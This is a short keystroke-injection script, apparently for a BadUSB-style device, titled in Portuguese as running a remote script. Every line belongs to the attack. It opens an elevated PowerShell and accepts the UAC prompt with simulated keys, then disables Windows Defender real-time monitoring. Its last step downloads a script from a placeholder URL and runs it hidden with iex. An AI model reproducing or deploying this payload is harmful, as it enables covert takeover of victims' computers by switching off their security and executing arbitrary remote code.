# Rodar Script Remoto
```bash
Delay 1000
GuiR
## Implementar
WinPrintLine powershell Start-Process powershell -Verb runAs
Delay 1000
Press KEY_LEFT_ALT
Press Y
Release
Delay 2000
Press KEY_LEFT_ARROW
PressRelease KEY_ENTER
Release
Delay 1000

WinPrintLine Set-MpPreference -DisableRealtimeMonitoring $true

## Definir URL do Script

WinPrintLine $u='URL-SCRIPT';
WinPrintLine $d=New-Object Net.WebClient; $f='t.ps1';$d.DownloadFile($u,$f); powershell -w h -c "gc $f -Raw|iex";
```
